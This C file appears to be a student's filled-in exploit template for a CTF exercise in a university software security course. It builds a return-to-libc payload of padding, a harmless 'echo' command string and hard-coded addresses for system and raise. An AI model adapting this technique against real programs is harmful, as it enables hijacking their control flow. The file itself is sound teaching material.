/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXX" //XXXXXXXXXXXXXX"
	//"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"echo -n xyzzy! > magic.txt"
	"\x40\x20\xe2\xb3" //0xb3e23040 <system> 0xb3e22040 0xb3e22040
	"\x40\x1d\xe1\xb3" // 0xb3e12d40 <raise> 0xb3e11d40
	"\x01\xc3\xff\xbf" // <system arg> pointer to string 0xbfffc329 0xBFFFC301
	"\x0c"; // <raise> argument
	//"echo -n xyzzy! > magic.txt\x0";


	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
